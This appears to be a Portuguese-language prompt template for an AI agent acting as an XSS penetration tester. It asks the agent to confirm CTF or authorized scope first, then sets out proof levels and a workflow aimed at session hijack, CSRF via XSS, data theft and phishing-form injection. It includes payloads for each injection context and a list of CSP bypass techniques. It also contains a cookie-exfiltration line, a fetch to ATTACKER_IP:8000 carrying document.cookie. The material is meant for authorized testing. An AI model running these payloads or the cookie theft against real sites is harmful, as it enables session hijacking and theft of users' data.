# Fase 4d: Exploração — XSS
## Target: {{TARGET}}

> Baseado em: Shannon `exploit-xss.txt`
> Input: Fila de `deliverables/03d_vuln_xss.md`
> Output: `deliverables/04d_exploit_xss.md`

---

## ⚠️ Contexto: Perguntar antes de executar
> Antes de iniciar esta fase, confirmar: **HTB/CTF** ou **Real/Autorizado**?
> Isso determina quais ferramentas e técnicas são aplicáveis.

## Papel
Penetration tester de XSS. Provar execução de JS e impacto real (session hijack, data theft).

## Níveis de Prova
| Nível | Descrição | Classificação |
|-------|-----------|---------------|
| 1 | Payload refletido mas encoded/sanitized | NOT VULNERABLE |
| 2 | Payload no HTML mas JS bloqueado (CSP/filtro) | POTENTIAL |
| 3 | **JavaScript executa** (alert, console.log, DOM manip) | **EXPLOITED** |
| 4 | **Session hijack / data theft / unauthorized action** | **EXPLOITED (CRITICAL)** |

## Workflow: Graph-Based Exploitation

### Stage 1: Understand & Setup
Para cada XSS-VULN-XX:
- [ ] Revisar: source, path, sink, render_context, encoding_observed
- [ ] Usar `mismatch_reason` para craftar payload inicial
- [ ] Verificar CSP headers do alvo

### Stage 2: Craft & Execute
- [ ] Craftar payload que:
  - Sobrevive às sanitizações do path
  - Explora o render context específico
  - Atinge o mismatch identificado
- [ ] Testar via curl/browser

### Stage 3: Demonstrate Impact
- [ ] Ir além de `alert(1)`:
  - Session hijack: `document.cookie` → exfiltrar
  - CSRF via XSS: executar ação como vítima
  - Info disclosure: extrair dados sensíveis do DOM
  - Credential phishing: injetar formulário falso

## Payloads por Contexto

### HTML Body
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### HTML Attribute
```html
" onmouseover=alert(1) x="
' autofocus onfocus=alert(1) '
```

### JavaScript String
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### URL Context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## CSP Bypass Techniques
- JSONP endpoints em domínios permitidos
- Script gadgets em libs permitidas (AngularJS, jQuery)
- `base` tag injection
- `<meta>` para desabilitar CSP (se injeção no `<head>`)

## Session Steal Payload
```javascript
// Se cookie não tem HttpOnly:
fetch('http://ATTACKER_IP:8000/?c='+document.cookie)

// Se tem HttpOnly mas não Secure:
// Usar XSS para fazer requests autenticados (CSRF via XSS)
```

## Deliverable → `deliverables/04d_exploit_xss.md`
